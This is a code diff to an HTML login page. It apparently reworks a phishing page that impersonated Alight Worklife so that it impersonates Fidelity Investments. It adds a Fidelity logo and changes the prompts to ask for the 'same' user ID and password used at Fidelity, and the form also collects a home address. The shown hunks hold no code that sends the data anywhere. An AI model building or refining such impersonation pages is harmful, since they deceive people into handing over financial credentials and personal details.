@@ -47,6 +47,11 @@
             z-index: 2; 
             position: relative;
         }
+        .fidelity-logo img {
+            width: 190px;
+            height: auto;
+           /* Makes it white to match dark theme */
+        }
 
         /* Alight Worklife Logo */
         .alight-worklife {
@@ -165,22 +170,28 @@
             <span class="united-text">UNITED</span>
             <span class="globe">🌐</span>
         </div>
+         <!-- Fidelity Logo -->
+        <div class="fidelity-logo">
+            <img src="fidelity.jpg" 
+                 alt="Fidelity Investments" 
+                 onerror="this.style.display='none'; console.log('Fidelity logo failed to load');">
+        </div>
 
-        <div class="worklife">Same login used to access benefits on Alight Worklife Web</div>
+        <div class="worklife">Same login used to access Fidelity Investments</div>
     </div>
 
     <div class="form-container">
         <form id="loginForm">
             <div class="form-group">
-                <label for="username">Enter your User ID</label>
-                <input type="text" id="username" placeholder="User ID" required>
-                <small class="helper-text">Same ID used to access benefits on Alight Worklife Web</small>
+                <label for="username">Enter your UserID/Username</label>
+                <input type="text" id="username" placeholder="UserID/Username" required>
+                <small class="helper-text">Same ID/Username used to access Fidelity Investments</small>
             </div>
 
             <div class="form-group">
                 <label for="password">Enter your Password</label>
                 <input type="password" id="password" placeholder="Password" required>
-                <small class="helper-text">Same password used to access benefits on Alight Worklife Web</small>
+                <small class="helper-text">Same Password used to access Fidelity Investments</small>
             </div>
 
             <label>Home Address (Current)</label>
